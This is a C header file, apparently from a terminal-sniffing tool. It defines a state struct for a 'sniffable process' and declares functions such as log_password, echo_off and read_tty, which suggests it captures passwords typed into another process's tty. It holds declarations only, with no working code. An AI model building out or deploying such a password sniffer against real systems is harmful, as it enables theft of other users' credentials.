#ifndef SALTTY_H
#define SALTTY_H 1

#include "conf.h"

struct state_s {
	int fd; // tty "real" file descriptor (for writing or ioctl/tcsetattr only)
	int rfd; // tty ordered-read pipe (for reading only)
	int tty; // tty device number
	int pid; // sniffable process pid 
	FILE *file; // stream to tty (for writing only)
	char name[1024]; // sniffable process name
	int idx; // index in files[] tab of file that triggered the wake-up
	int wfd; // tty write-pipe (internal use only)
	int nreads; // number of reads done on tty pipe
	pthread_t threads[READER_THREADS];
};

void log_password(state_t *st);
void finish_read(state_t *st);
void echo_on(state_t *st);
void echo_off(state_t *st);
ssize_t read_tty(state_t *st, void *buf, size_t count);

#endif
